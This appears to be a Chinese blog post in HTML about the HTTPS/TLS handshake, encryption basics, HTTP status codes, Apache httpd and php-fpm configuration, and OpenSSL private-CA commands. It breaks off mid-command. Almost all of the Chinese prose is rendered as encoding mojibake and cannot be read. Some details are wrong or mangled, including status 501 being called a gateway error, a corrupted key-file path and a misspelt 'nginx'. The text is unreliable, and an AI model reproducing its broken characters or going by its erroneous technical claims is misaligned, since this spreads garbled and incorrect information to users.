<p>httpsçš„åŸç†å°±æ˜¯åœ¨åŸæ¥httpåè®®çš„åŸºç¡€ä¸Šæ·»åŠ äº†ä¸€å±‚å®‰å…¨å¥—æ¥å±‚sslå¯¹ä¼ è¾“çš„æ•°æ®è¿›è¡ŒåŠ å¯†ã€‚æˆ‘ä»¬åœ¨tcpä¸‰æ¬¡æ¡æ‰‹å®Œæˆåï¼Œæ­£å¼ä¼ è¾“æ•°æ®å‰è¿˜éœ€è¦è¿›è¡Œsslæ¡æ‰‹äº¤æ¢å½¼æ­¤çš„å¯†é’¥ã€è¯ä¹¦ã€‚</p>
<h2 id="httpsæ¡æ‰‹è¿‡ç¨‹"><a href="#httpsæ¡æ‰‹è¿‡ç¨‹" class="headerlink" title="httpsæ¡æ‰‹è¿‡ç¨‹"></a>httpsæ¡æ‰‹è¿‡ç¨‹</h2><p><img src="/archives/ac8f02b1/Untitled.png"></p>
<h3 id="Step1ï¼šClient-Hello"><a href="#Step1ï¼šClient-Hello" class="headerlink" title="Step1ï¼šClient Hello"></a>Step1ï¼šClient Hello</h3><p>æŠ¥æ–‡åŒ…å«ï¼š</p>
<ol>
<li>TLSç‰ˆæœ¬</li>
<li>éšæœºæ•°ï¼šrandom1 åŒ…å«ä¸¤éƒ¨åˆ†ï¼šæ—¶é—´æˆ³ï¼ˆ4å­—èŠ‚ï¼‰+éšæœºæ•°ï¼ˆ28å­—èŠ‚</li>
<li>session-id:ç”¨æ¥è¡¨æ˜ä¸€æ¬¡ä¼šè¯ï¼Œç¬¬ä¸€æ¬¡å»ºç«‹æ²¡æœ‰ã€‚å¦‚æœä»¥å‰å»ºç«‹è¿‡ï¼Œå¯ä»¥ç›´æ¥å¸¦è¿‡</li>
<li>åŠ å¯†ç®—æ³•å¥—è£…åˆ—è¡¨ï¼šå®¢æˆ·ç«¯æ”¯æŒçš„åŠ å¯†-ç­¾åç®—æ³•åˆ—</li>
<li>å‹ç¼©ç®—æ³•ï¼šä¸€èˆ¬ä¸é€‚</li>
<li>æ‰©å±•å­—æ®µï¼šå¯†ç äº¤æ¢ç®—æ³•çš„å‚æ•°ã€è¯·æ±‚ä¸»æœºçš„åå­—</li>
</ol>
<h3 id="Step2ï¼šServer-Hello"><a href="#Step2ï¼šServer-Hello" class="headerlink" title="Step2ï¼šServer Hello"></a>Step2ï¼šServer Hello</h3><p>æŠ¥æ–‡åŒ…æ‹¬ï¼š</p>
<ol>
<li>TLSç‰ˆæœ¬å·ï¼šå’Œå®¢æˆ·ç«¯ä¸Šä¼ çš„ç‰ˆæœ¬å·å¯¹æ¯”ï¼Œä½¿ç”¨ç›¸åº”çš„ç‰ˆæœ¬</li>
<li>ç¡®å®šåŠ å¯†å¥—ä»¶ï¼Œå‹ç¼©ç®—æ³•</li>
<li>äº§ç”Ÿä¸€ä¸ªéšæœºæ•°random2,æ­¤æ—¶å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯éƒ½æ‹¥æœ‰äº†ä¸¤ä¸ªéšæœºæ•°</li>
</ol>
<h3 id="Step3ï¼šServer-â‡’-Client"><a href="#Step3ï¼šServer-â‡’-Client" class="headerlink" title="Step3ï¼šServer â‡’ Client"></a>Step3ï¼šServer â‡’ Client</h3><p>æŠ¥æ–‡åŒ…æ‹¬ï¼š</p>
<ol>
<li><p>Certificat: æœåŠ¡å™¨å‘CAç”³è¯·çš„è¯ä¹¦</p>
</li>
<li><p>Server Key Exchange:</p>
<p> è¿™ä¸ªæ¶ˆæ¯æ˜¯ç”¨æ¥å‘é€å¯†é’¥äº¤æ¢ç®—æ³•ç›¸å…³å‚æ•°å’Œæ•°æ®çš„ã€‚è¿™é‡Œè¦æå‰æä¸€ä¸‹ï¼Œå°±æ˜¯æ ¹æ®å¯†é’¥äº¤æ¢ç®—æ³•çš„ä¸åŒï¼Œä¼ é€’çš„å‚æ•°ä¹Ÿæ˜¯ä¸åŒçš„ã€‚<br> å¸¸ç”¨çš„å¯†é’¥äº¤æ¢ç®—æ³•ï¼šRSAã€DHï¼ˆDiffie-Hellmanï¼‰ã€ECDHï¼ˆEllipticcurve Diffieâ€“Hellmanï¼‰ã€‚</p>
</li>
<li><p>Server Hello Done:ç”¨æ¥è¡¨ç¤ºæœåŠ¡ç«¯è¯´å®Œäº†ã€‚</p>
</li>
</ol>
<p>å®¢æˆ·ç«¯æ‹¿åˆ°è¯ä¹¦åï¼Œé€šè¿‡ä¿å­˜åœ¨æœ¬æœºçš„æ ¹è¯ä¹¦ï¼ŒéªŒè¯è¯¥è¯ä¹¦æ˜¯å¦åˆæ³•ï¼Œå–å¾—è¯ä¹¦ä¸­çš„å…¬é’¥ã€‚</p>
<h3 id="Step4ï¼šClient-Server"><a href="#Step4ï¼šClient-Server" class="headerlink" title="Step4ï¼šClient &#x3D;&gt; Server"></a>Step4ï¼šClient &#x3D;&gt; Server</h3><p>æŠ¥æ–‡åŒ…æ‹¬</p>
<ol>
<li>Client Key Exchangeï¼šäº¤æ¢å¯†é’¥å‚æ•°ï¼Œæ­¤æ—¶å®¢æˆ·ç«¯ä¼šç”Ÿæˆä¸€ä¸ªéšæœºæ•°random3,ç„¶åä½¿ç”¨ä»æœåŠ¡ç«¯å“ªé‡Œè·å–çš„å…¬é’¥è¿›è¡ŒåŠ å¯†å¾—åˆ°å¯†æ–‡ï¼Œç„¶åå‘é€åˆ°æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯æ”¶åˆ°è¿™ä¸ªå€¼åï¼Œä½¿ç”¨è‡ªå·±çš„ç§é’¥è¿›è¡Œè§£å¯†ï¼Œæ­¤æ—¶æœåŠ¡å™¨ä¸å®¢æˆ·ç«¯å°±éƒ½æœ‰äº†ä¸‰ä¸ªéšæœºæ•°äº†ã€‚</li>
<li>Change Cipher Spec:ç¼–ç æ”¹å˜é€šçŸ¥ã€‚è¿™ä¸€æ­¥æ˜¯å®¢æˆ·ç«¯é€šçŸ¥æœåŠ¡ç«¯åé¢å†å‘é€çš„æ¶ˆæ¯éƒ½ä¼šä½¿ç”¨å‰é¢åå•†å‡ºæ¥çš„ç§˜é’¥åŠ å¯†äº†ï¼Œæ˜¯ä¸€æ¡äº‹ä»¶æ¶ˆæ¯ã€‚</li>
<li>Encrypted Handshake Message:è¿™ä¸€æ­¥å¯¹åº”çš„æ˜¯ Client Finish æ¶ˆæ¯ï¼Œå®¢æˆ·ç«¯å°†å‰é¢çš„æ¡æ‰‹æ¶ˆæ¯ç”Ÿæˆæ‘˜è¦(éšæœºæ•°)å†ç”¨åå•†å¥½çš„ç§˜é’¥åŠ å¯†ï¼Œè¿™æ˜¯å®¢æˆ·ç«¯å‘å‡ºçš„ç¬¬ä¸€æ¡åŠ å¯†æ¶ˆæ¯ã€‚æœåŠ¡ç«¯æ¥æ”¶åä¼šç”¨ç§˜é’¥è§£å¯†ï¼Œèƒ½è§£å‡ºæ¥è¯´æ˜å‰é¢åå•†å‡ºæ¥çš„ç§˜é’¥æ˜¯ä¸€è‡´çš„ã€‚</li>
</ol>
<h3 id="Step5ï¼šServer-â‡’-Client"><a href="#Step5ï¼šServer-â‡’-Client" class="headerlink" title="Step5ï¼šServer â‡’ Client"></a>Step5ï¼šServer â‡’ Client</h3><p>æŠ¥æ–‡åŒ…æ‹¬</p>
<ol>
<li>New Session Ticket:åŒ…å«äº†ä¸€ä¸ªåŠ å¯†é€šä¿¡æ‰€éœ€è¦çš„ä¿¡æ¯ï¼Œè¿™äº›æ•°æ®é‡‡ç”¨ä¸€ä¸ªåªæœ‰æœåŠ¡å™¨çŸ¥é“çš„å¯†é’¥è¿›è¡ŒåŠ å¯†ã€‚ç›®æ ‡æ˜¯æ¶ˆé™¤æœåŠ¡å™¨éœ€è¦ç»´æŠ¤æ¯ä¸ªå®¢æˆ·ç«¯çš„ä¼šè¯çŠ¶æ€ç¼“å­˜çš„è¦æ±‚ã€‚è¿™éƒ¨åˆ†å†…å®¹åœ¨åé¢çš„æ‰©å±•éƒ¨åˆ†ä¼šè®²åˆ°</li>
<li>Change Cipher Spec:ç¼–ç æ”¹å˜é€šçŸ¥ã€‚è¿™ä¸€æ­¥æ˜¯æœåŠ¡ç«¯é€šçŸ¥å®¢æˆ·ç«¯åé¢å†å‘é€çš„æ¶ˆæ¯éƒ½ä¼šä½¿ç”¨åŠ å¯†ï¼Œä¹Ÿæ˜¯ä¸€æ¡äº‹ä»¶æ¶ˆæ¯ã€‚</li>
<li>Encrypted Handshake Message:è¿™ä¸€æ­¥å¯¹åº”çš„æ˜¯ Server Finish æ¶ˆæ¯ï¼ŒæœåŠ¡ç«¯ä¹Ÿä¼šå°†æ¡æ‰‹è¿‡ç¨‹çš„æ¶ˆæ¯ç”Ÿæˆæ‘˜è¦å†ç”¨ç§˜é’¥åŠ å¯†ï¼Œè¿™æ˜¯æœåŠ¡ç«¯å‘å‡ºçš„ç¬¬ä¸€æ¡åŠ å¯†æ¶ˆæ¯ã€‚å®¢æˆ·ç«¯æ¥æ”¶åä¼šç”¨ç§˜é’¥è§£å¯†ï¼Œèƒ½è§£å‡ºæ¥è¯´æ˜åå•†çš„ç§˜é’¥æ˜¯ä¸€è‡´çš„ã€‚</li>
</ol>
<h2 id="æˆ‘ä»¬ä¸ºä»€ä¹ˆéœ€è¦https"><a href="#æˆ‘ä»¬ä¸ºä»€ä¹ˆéœ€è¦https" class="headerlink" title="æˆ‘ä»¬ä¸ºä»€ä¹ˆéœ€è¦https"></a>æˆ‘ä»¬ä¸ºä»€ä¹ˆéœ€è¦https</h2><p>httpåè®®åœ¨äº’è”ç½‘ä¸Šæ˜¯æ˜æ–‡ä¼ è¾“çš„ï¼Œé‚£ä¹ˆå°±å¯èƒ½å­˜åœ¨æ•°æ®è¢«æˆªè·ã€ç¯¡æ”¹çš„å¯èƒ½ã€‚ä¸ºäº†ä¿¡æ¯å®‰å…¨äºæ˜¯åœ¨httpåè®®çš„åŸºç¡€ä¸Šæ·»åŠ äº†ä¸€å±‚å®‰å…¨å¥—æ¥å±‚ï¼Œä¹Ÿå°±æ˜¯sslã€‚sslç°åœ¨å·²ç»å‘å±•åˆ°TLSäº†ï¼Œå½“å‰ä¸»æµçš„ä½¿ç”¨ä¹Ÿæ˜¯TLSæ–¹å¼åŠ å¯†ã€‚é‚£ä¹ˆè¿™ä¸ªåŠ å¯†è¿‡ç¨‹åˆ°åº•æ˜¯æ€æ ·çš„å‘¢ã€‚é¦–å…ˆæˆ‘ä»¬éœ€è¦äº†è§£ä¸¤ç§åŠ å¯†æ–¹å¼ã€‚å¯¹ç§°åŠ å¯†äºéå¯¹ç§°åŠ å¯†ã€‚</p>
<p>å¯¹ç§°åŠ å¯†ä¹Ÿå°±æ˜¯ï¼Œé€šä¿¡åŒæ–¹å…¬ç”¨åŒä¸€ä¸ªå¯†é’¥è¿›è¡ŒåŠ å¯†ä¸è§£å¯†ï¼Œé‚£ä¹ˆé—®é¢˜æ¥äº†ï¼ŒåŒæ–¹è¦è¿›è¡Œå¯¹ç§°åŠ å¯†é€šä¿¡åˆ™å¿…é¡»è¦è¿›è¡Œäº¤æ¢å¯†é’¥çš„æ“ä½œï¼Œäº¤æ¢å¯†é’¥çš„è¿‡ç¨‹åŠ¿å¿…ä½¿æ˜æ–‡ä¼ è¾“çš„ï¼Œé‚£ä¹ˆå¯†é’¥å°±å­˜åœ¨æ³„éœ²çš„é£é™©ï¼Œé‚£ä¹ˆå¯¹ç§°åŠ å¯†é€šä¿¡ä¹Ÿå°±ä¸å†å®‰å…¨äº†ã€‚</p>
<p>éå¯¹ç§°åŠ å¯†ï¼Œé€šä¿¡åŒæ–¹ä½¿ç”¨å„è‡ªçš„å…¬é’¥ç§é’¥è¿›è¡ŒåŒè¡Œï¼Œç§é’¥è¿›è¡ŒåŠ å¯†ï¼Œå…¬é’¥è¿›è¡ŒéªŒè¯ï¼Œç§é’¥åŠ å¯†çš„æ•°æ®åªèƒ½è¢«å…¬é’¥è§£å¯†ï¼Œå…¬é’¥åŠ å¯†çš„æ•°æ®åªèƒ½è¢«ç§é’¥è§£å¯†ï¼Œç§é’¥åªæœ‰å‘ä¿¡æ–¹æœ¬äººçŸ¥é“ï¼Œå…¬é’¥å‘ä¸ä¹‹é€šä¿¡çš„äººå…¬å¼€ï¼Œé‚£ä¹ˆé€šè¿‡å…¬é’¥åŠ å¯†çš„æ•°æ®å°±åªèƒ½è¢«æ‹¥æœ‰ç§é’¥çš„æ¥æ”¶æ–¹è§£å¯†ï¼Œä½†é€šè¿‡ç§é’¥åŠ å¯†çš„æ•°æ®å´èƒ½è¢«æ‰€æœ‰æ‹¥æœ‰å…¬é’¥çš„äººè§£å¯†ï¼Œä¸”é€šè¿‡å…¬é’¥åŠ å¯†çš„æ•°æ®è™½ç„¶ä¿è¯äº†å®‰å…¨æ€§ï¼Œä½†æ•°æ®å®Œæ•´æ€§å´æ²¡æœ‰å¾—åˆ°ä¿è¯ï¼Œå…¶ä»å­˜åœ¨è¢«ç¯¡æ”¹çš„å¯èƒ½ï¼Œä¸ºäº†è§£å†³æ•°æ®å®Œæ•´æ€§ä¸å…¬é’¥åŠ å¯†æ•°æ®çš„å®‰å…¨æ€§é—®é¢˜ï¼Œæˆ‘ä»¬åˆå¼•å…¥å¦å¤–ä¸¤ä¸ªæ¦‚å¿µCAä¸æ•°å­—æ‘˜è¦ã€æ•°å­—ç­¾åã€‚</p>
<p>æ—¢ç„¶æ•°æ®å¯èƒ½åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­è¢«ç¯¡æ”¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦è®©æ•°æ®æ¥æ”¶æ–¹èƒ½å¤Ÿé€šè¿‡ä¸€ä¸ªç‰¹å¾éªŒè¯æ•°æ®çš„çœŸä¼ªå°±å¯ä»¥äº†ï¼Œè¿™ä¸ªéªŒè¯ç‰¹å¾å°±æ˜¯æ•°å­—æ‘˜è¦ï¼Œå°†æºæ•°æ®é€šè¿‡å“ˆå¸Œç®—æ³•è¿›è¡Œæ•£åˆ—å¾—åˆ°ä¸€ä¸ªæ‘˜è¦éšç€æ•°æ®ä¸€åŒå‘é€ã€‚å“ˆå¸Œç®—æ³•çš„ç‰¹å¾ä¿è¯äº†å“ˆå¸Œå€¼çš„åŸºæœ¬å”¯ä¸€æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨æ¥å—åˆ°æ•°æ®åå¯¹æ”¶åˆ°çš„æ•°æ®ä½¿ç”¨åŒæ ·çš„hashç®—æ³•ï¼Œå¾—åˆ°ä¸€ä¸ªhashå€¼å¯¹æ¯”æ¥æ”¶åˆ°çš„hashå€¼ï¼Œå¦‚æœä¸¤è€…ä¸€è‡´ï¼Œé‚£ä¹ˆå°±ä¿è¯äº†æ•°æ®æ²¡æœ‰è¢«ç¯¡æ”¹è¿‡ã€‚é‚£ä¹ˆä¸ºä»€ä¹ˆåˆéœ€è¦æ•°å­—ç­¾åå‘¢ï¼Œå‰é¢æåˆ°äº†ï¼Œæ‘˜è¦å¦‚æœæ˜æ–‡ä¼ è¾“çš„è¯ï¼Œå°±å¯èƒ½è¢«æˆªè·ï¼Œå¹¶æ•´ä¸ªç¯¡æ”¹ã€‚</p>
<h1 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h1><h1 id="å®¢æˆ·ç«¯"><a href="#å®¢æˆ·ç«¯" class="headerlink" title="å®¢æˆ·ç«¯"></a>å®¢æˆ·ç«¯</h1><h2 id="èƒ–å®¢æˆ·ç«¯"><a href="#èƒ–å®¢æˆ·ç«¯" class="headerlink" title="èƒ–å®¢æˆ·ç«¯"></a>èƒ–å®¢æˆ·ç«¯</h2><p>è¯·æ±‚çš„èµ„æºåœ¨å®¢æˆ·ç«¯åŠ è½½è¿è¡Œ</p>
<p>ä¸å®‰å…¨</p>
<h2 id="ç˜¦å®¢æˆ·ç«¯"><a href="#ç˜¦å®¢æˆ·ç«¯" class="headerlink" title="ç˜¦å®¢æˆ·ç«¯"></a>ç˜¦å®¢æˆ·ç«¯</h2><p>è¯·æ±‚çš„èµ„æºåœ¨æœåŠ¡å™¨è¿è¡Œå®Œè¿”å›è¿è¡Œç»“æœ</p>
<h1 id="æœåŠ¡å™¨"><a href="#æœåŠ¡å™¨" class="headerlink" title="æœåŠ¡å™¨"></a>æœåŠ¡å™¨</h1><h2 id="åŠ¨æ€çš„webæœåŠ¡å™¨"><a href="#åŠ¨æ€çš„webæœåŠ¡å™¨" class="headerlink" title="åŠ¨æ€çš„webæœåŠ¡å™¨"></a>åŠ¨æ€çš„webæœåŠ¡å™¨</h2><p>æ‰§è¡Œä»£ç ï¼Œè¿”å›è¿è¡Œç»“æœ</p>
<p>php-phpæœåŠ¡å™¨ </p>
<p>jsp-tomcat</p>
<p>asp-iis</p>
<h2 id="é™æ€çš„webæœåŠ¡å™¨"><a href="#é™æ€çš„webæœåŠ¡å™¨" class="headerlink" title="é™æ€çš„webæœåŠ¡å™¨"></a>é™æ€çš„webæœåŠ¡å™¨</h2><p>ç›´æ¥è¿”å›åŸèµ„æº</p>
<p>apache ngix iis</p>
<h1 id="httpçŠ¶æ€ç "><a href="#httpçŠ¶æ€ç " class="headerlink" title="httpçŠ¶æ€ç "></a>httpçŠ¶æ€ç </h1><p>100 æç¤ºä¿¡æ¯</p>
<p>200 æˆåŠŸ</p>
<p>300 é‡å®šå‘</p>
<p>301 æ°¸ä¹…é‡å®šå‘</p>
<p>302 ä¸´æ—¶é‡å®šå‘</p>
<p>400 å®¢æˆ·ç«¯é”™è¯¯</p>
<p>403 forbiden</p>
<p>404 not found</p>
<p>500 æœåŠ¡ç«¯é”™è¯¯</p>
<p>501 ç½‘å…³é”™è¯¯</p>
<p>httpåè®®æ˜¯ä¸€ç§æ— çŠ¶æ€çš„åè®®ï¼Œæ¯æ¬¡åªèƒ½è¯·æ±‚ä¸€ä¸ªèµ„æºï¼Œå¦‚æœæƒ³ä¸€æ¬¡è¯·æ±‚å¤šä¸ªèµ„æºï¼Œå¯ä»¥ä½¿ç”¨åˆ°é•¿è¿æ¥ï¼Œé•¿è¿æ¥é€šè¿‡æ—¶é—´ä¸è¿æ¥æ•°é‡æ¥æ§åˆ¶ç”Ÿå­˜æ—¶é—´ï¼Œä»è€Œä¸ç„¶è¯¥è¿æ¥å æ®å¤ªå¤šçš„å¸¦å®½</p>
<p>cd &#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;</p>
<p>touch keepalive.conf</p>
<p>å†™å…¥ä»¥ä¸‹å†…å®¹</p>
<p>KeepAlive on</p>
<p>MaxKeepAliveRequests 500</p>
<p>KeepAliveTimeout 5</p>
<p>è®¾ç½®é•¿è¿æ¥</p>
<p>restful é£æ ¼ï¼ŒåŸºäºè·¯å¾„çš„é£æ ¼,ä¸»æµé£æ ¼</p>
<h1 id="APACHE-HTTPD"><a href="#APACHE-HTTPD" class="headerlink" title="APACHE-HTTPD"></a>APACHE-HTTPD</h1><h1 id="httpdä¸»é…ç½®æ–‡ä»¶"><a href="#httpdä¸»é…ç½®æ–‡ä»¶" class="headerlink" title="httpdä¸»é…ç½®æ–‡ä»¶"></a>httpdä¸»é…ç½®æ–‡ä»¶</h1><h2 id="å…¨å±€é…ç½®"><a href="#å…¨å±€é…ç½®" class="headerlink" title="å…¨å±€é…ç½®"></a>å…¨å±€é…ç½®</h2><p>ServerRoot â€œ&#x2F;etc&#x2F;httpdâ€ &#x2F;&#x2F;è®¾ç½®é…ç½®æ–‡ä»¶çš„æ ¹ç›®å½•ï¼Œè¯¥é…ç½®æ–‡ä»¶ä¸­åé¢çš„æ‰€æœ‰ç›¸å¯¹è·¯å¾„éƒ½æ˜¯åŸºäºè¯¥ç›®å½•å¼€å§‹çš„</p>
<p>Listen 80 &#x2F;&#x2F;é…ç½®ç›‘å¬çš„ç«¯å£ï¼Œå¯å¤å†™å¤šä¸ª</p>
<p>Listen ipaddr:80</p>
<p>User apache</p>
<p>Group apache &#x2F;&#x2F;ä»¥ä»€ä¹ˆèº«ä»½è¿è¡Œ</p>
<p>ServerAdmin root@localhost &#x2F;&#x2F;æŠ¥é”™ä¿¡æ¯å‘é€ç›®æ ‡</p>
<h2 id="ä¸­å¿ƒä¸»æœºé…ç½®"><a href="#ä¸­å¿ƒä¸»æœºé…ç½®" class="headerlink" title="ä¸­å¿ƒä¸»æœºé…ç½®"></a>ä¸­å¿ƒä¸»æœºé…ç½®</h2><p>DocumentRoot â€œ&#x2F;var&#x2F;www&#x2F;htmlâ€ &#x2F;&#x2F;ä¸­å¿ƒä¸»æœºæ ¹ç›®å½•</p>
<p>&lt;Location â€œurlâ€&gt;</p>
<p>åŸºäºurlçš„æƒé™è®¾ç½®</p>
</Location>

<p>&lt;files â€œæœ¬åœ°æ–‡ä»¶è·¯å¾„â€&gt;</p>
<p>é’ˆå¯¹æ–‡ä»¶çš„æƒé™è®¾ç½®</p>
</files>

<p>&lt;Directory â€œæœ¬åœ°ç›®å½•â€&gt;</p>
<p>require all granted|denied</p>
<p>Allowoverride all|none|directive_type &#x2F;&#x2F;ä¸.htaccessæ–‡ä»¶ç›¸å…³ï¼Œå¦‚æœè®¾ç½®ä¸ºå…è®¸ï¼Œåˆ™å¦‚æœè¯¥æ–‡ä»¶ä¸­çš„directoryä¸é…ç½®æ–‡ä»¶ä¸­çš„directoryå†²çªï¼Œé…ç½®æ–‡ä»¶ä¸­çš„å†…å®¹å°†è¢«è¦†ç›–ã€‚</p>
<p>Options Indexes|FollowSymboLinks|none|all</p>
<p>require ip ipaddr granted|denied &#x2F;&#x2F;æŒ‰ipé…ç½®æƒé™</p>
<p>AuthType Basic &#x2F;&#x2F;è®¤è¯ç±»å‹</p>
<p>AuthName â€œè¯·è¾“å…¥ä½ çš„ç”¨æˆ·åâ€ &#x2F;&#x2F;è¦è®¤è¯çš„ç”¨æˆ·</p>
<p>AuthUserFile â€œ&#x2F;etc&#x2F;httpd&#x2F;.htpasswdâ€ &#x2F;&#x2F;åˆæ³•ç”¨æˆ·åˆ—è¡¨</p>
<p>Require valid-user &#x2F;&#x2F; åˆæ³•çš„ç”¨æˆ·å‡å¯è®¿é—®è¯¥ç›®å½• </p>
</directory>

<p>htpasswd -c æ–‡ä»¶ æ–°å»ºçš„ç”¨æˆ·å &#x2F;&#x2F;é…ç½®äº†è®¤è¯é€‰é¡¹ä¹‹åï¼Œæ‰§è¡Œå‘½ä»¤ï¼Œåˆ›å»ºå¯ä¾›ç™»å½•çš„ç”¨æˆ·  <a href="//window">&#x2F;&#x2F;window</a> åŒæ ·æœ‰è¯¥å‘½ä»¤</p>
<IFModule dir_module>

<p>DirectoryIndex index.html &#x2F;&#x2F;å¦‚æœå­˜åœ¨dir_moduleæ¨¡å—åˆ™ï¼Œè®¾ç½®é»˜è®¤é¡µé¢ä¸ºindex.html</p>
</IFModule>

<p>Errorlog â€œæœ¬åœ°ç›®å½•â€</p>
<p>LogLevel warn <a href="//debug">&#x2F;&#x2F;debug</a> info notice warn error crit alert emerg  è®°å½•å¤§äºæˆ–è€…ç­‰äºwarnçš„é”™è¯¯æ—¥å¿—</p>
<IfModule log_config_module>

<p>LogFormat â€œ%h %u %l %t &quot;%r&quot; &quot;%{Referer}i&quot;â€œ  combined &#x2F;&#x2F;è®¿é—®æ—¥å¿—æ–‡ä»¶æ ¼å¼ï¼Œæœ€åä¸ºåç§°</p>
<p>CustomLog â€œè®¿é—®æ—¥å¿—è·¯å¾„â€ combined(å¯ç”¨çš„æ ¼å¼)</p>
</IfModule>

<IFModule alias_module>

<p><strong><code>Alias /webpath æœ¬åœ°æ–‡ä»¶è·¯å¾„ //å°†æœ¬åœ°æ–‡ä»¶è·¯å¾„æ˜ å°„åˆ°urlè·¯å¾„</code>  &#x2F;&#x2F;restfulé£æ ¼</strong></p>
</IFModule>

<p>ErrorDocument 404 filepath &#x2F;&#x2F;è‡ªå®šä¹‰é”™è¯¯é¡µé¢</p>
<p>ServerName <a href="http://www.armandhe.com/">www.armandhe.com:80</a>  &#x2F;&#x2F;é…ç½®ä¸»æœºå-FQDN</p>
<h2 id="è™šæ‹Ÿä¸»æœº"><a href="#è™šæ‹Ÿä¸»æœº" class="headerlink" title="è™šæ‹Ÿä¸»æœº"></a>è™šæ‹Ÿä¸»æœº</h2><p>ä¸€å°æœåŠ¡å™¨ä¸Šå¯ä»¥è¿è¡Œå¤šä¸ªä¸»æœºï¼Œä¸€ä¸ªä¸­å¿ƒä¸»æœºï¼Œå…¶ä»–è™šæ‹Ÿä¸»æœºã€‚åœæ‰ä¸­å¿ƒä¸»æœºåå»ºç«‹è™šæ‹Ÿä¸»æœº</p>
<p>ä¸­å¿ƒä¸»æœºä¸è™šæ‹Ÿä¸»æœºå¯é€šè¿‡ipåœ°å€ã€ç«¯å£å·ã€httpå¤´éƒ¨çš„hostsæ¥åŒºåˆ†</p>
<p>å•ç‹¬å»ºç«‹ä¸€ä¸ªè™šæ‹Ÿä¸»æœºï¼Œæ–°å»ºä¸€ä¸ªé…ç½®æ–‡ä»¶</p>
<p>cd &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;conf.d</p>
<p>touch virtualhost.conf</p>
<p>åœ¨è¯¥æ–‡ä»¶ä¸­å†™å…¥</p>
<p>&lt;VirtualHost 172.16.11.16:80&gt;</p>
<p>DocumentRoot â€œ&#x2F;aâ€</p>
<p>&lt;Directory â€œ&#x2F;aâ€&gt;</p>
<p>Require all granted</p>
</Directory>

</VirtualHost>

<h1 id="åŠ¨æ€æœåŠ¡å™¨å·¥ä½œç»“æ„"><a href="#åŠ¨æ€æœåŠ¡å™¨å·¥ä½œç»“æ„" class="headerlink" title="åŠ¨æ€æœåŠ¡å™¨å·¥ä½œç»“æ„"></a>åŠ¨æ€æœåŠ¡å™¨å·¥ä½œç»“æ„</h1><p>å®¢æˆ·ç«¯çš„æ¶ˆæ¯å‘é€åˆ°httpdä¹‹åï¼Œå¦‚æœæ˜¯è¯·æ±‚é™æ€èµ„æºï¼Œhttpdç›´æ¥å°†æ•°æ®å‘é€åˆ°å®¢æœè¯·æ±‚çš„æ˜¯åŠ¨æ€çš„èµ„æºï¼Œåˆ™è¯·æ±‚è¢«ä¼ é€åˆ°phpæœåŠ¡å™¨ï¼ŒphpæœåŠ¡å™¨å¤„ç†å®Œä¹‹åå†å°†ç»“æœå‘é€åˆ°httpdï¼Œç”±httpdå‘é€ç»™å®¢æˆ·ç«¯ã€‚</p>
<p><code>å•ä½“æ¶æ„</code></p>
<p>å‰ç«¯å’Œåç«¯å†™åœ¨ä¸€èµ·</p>
<p><code>å‰ååˆ†ç¦»</code></p>
<p>phpé»˜è®¤ç›‘å¬åœ¨9000ç«¯å£</p>
<p>phpä¸httpdçš„ç»“åˆæ–¹å¼åˆ†ä¸ºæ¨¡å—åŒ–ï¼Œä¸ç‹¬ç«‹è¿›ç¨‹ä¸¤ç§æ–¹å¼</p>
<p>æ¨¡å—åŒ–ï¼Œphpä½œä¸ºhttpdçš„ä¸€ä¸ªæ¨¡å—åµŒå…¥åˆ°httpdä¸­</p>
<p>ç‹¬ç«‹è¿›ç¨‹ï¼Œphpç‹¬ç«‹æˆä¸ºä¸€ä¸ªè¿›ç¨‹ã€‚</p>
<p>ç‹¬ç«‹è¿›ç¨‹phpå®‰è£…ï¼šyum install php-fpm</p>
<p><strong>ç‹¬ç«‹è¿›ç¨‹phpæœåŠ¡å™¨æ¶æ„</strong></p>
<p>cd &#x2F;etc&#x2F;php-fpm.d</p>
<p>vim <a href="http://www.conf/">www.conf</a></p>
<p>å°†å…è®¸è®¿é—®çš„å®¢æˆ·ç«¯ipåœ°å€ listen.allowed_clientsä¿®æ”¹ä¸ºä½ çš„apacheå®¢æˆ·ç«¯ipåœ°å€</p>
<p>åœ¨apacheçš„é…ç½®æ–‡ä»¶ä¸­å†™å…¥</p>
<p>ProxyPassMatch  â€œ&#x2F;(.*.php$) â€œ â€œfcgi:&#x2F;&#x2F;ipaddr:port-9000&#x2F;phpfile_path&#x2F;$1â€ &#x2F;&#x2F;åå‘ä»£ç†</p>
<p>åˆ é™¤phpæ¨¡å— ä¿ç•™é…ç½®æ–‡ä»¶ æ³¨é‡Šæ‰æœ€åä¸¤è¡Œ</p>
<h1 id="httpså®ç°"><a href="#httpså®ç°" class="headerlink" title="httpså®ç°"></a>httpså®ç°</h1><h2 id="è¯ä¹¦ç­¾å‘æµç¨‹"><a href="#è¯ä¹¦ç­¾å‘æµç¨‹" class="headerlink" title="è¯ä¹¦ç­¾å‘æµç¨‹"></a>è¯ä¹¦ç­¾å‘æµç¨‹</h2><p>yum install openssl 			<br>ç¬¬ä¸€æ­¥ åˆ›å»ºç§æœ‰CA<br>1ï¼š(umask 066;openssl genrsa -out &#x2F;etc&#x2F;pki&#x2F;CA&#x2F;private&#x2F;cakey.pem 2048)<br>ç”ŸæˆCAå¯†é’¥<br>2ï¼š openssl req -new -x509 -key &#x2F;etc&#x2F;pki&#x2F;CA&#x2F;private&#x2F;cacd key.pem -days 7300 -out &#x2F;etc&#x2F;pki&#x2F;CA&#x2F;cacert.pem<br>è‡ªç­¾CAè¯ä¹¦<br>ç¬¬äºŒæ­¥ ç”³è¯·è¯ä¹¦<br>1ï¼š  (umask 066;openssl genrsa -out &#x2F;etc&#x2F;httpd&#x2F;ssl&#x2F;httpd.key 2048)<br>ç”ŸæˆwebæœåŠ¡å™¨ç§é’¥<br>2ï¼š openssl req -new -key &#x2F;etc&#x2F;httpd&#x2F;ssl&#x2F;httpd.key -days 365 -out 